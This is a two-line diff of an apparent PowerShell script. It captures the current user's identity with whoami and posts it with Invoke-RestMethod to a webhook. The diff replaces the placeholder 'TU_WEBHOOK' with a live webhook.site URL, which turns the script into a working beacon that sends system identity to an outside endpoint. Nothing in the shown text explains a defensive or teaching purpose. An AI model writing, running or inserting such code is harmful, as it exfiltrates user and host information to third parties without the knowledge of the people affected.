@@ -1,2 +1,2 @@
 $info = whoami
-Invoke-RestMethod -Uri "TU_WEBHOOK" -Method Post -Body $info
+Invoke-RestMethod -Uri "https://webhook.site/7422bad4-b2c7-4886-9f4d-518c904adc29" -Method Post -Body $info
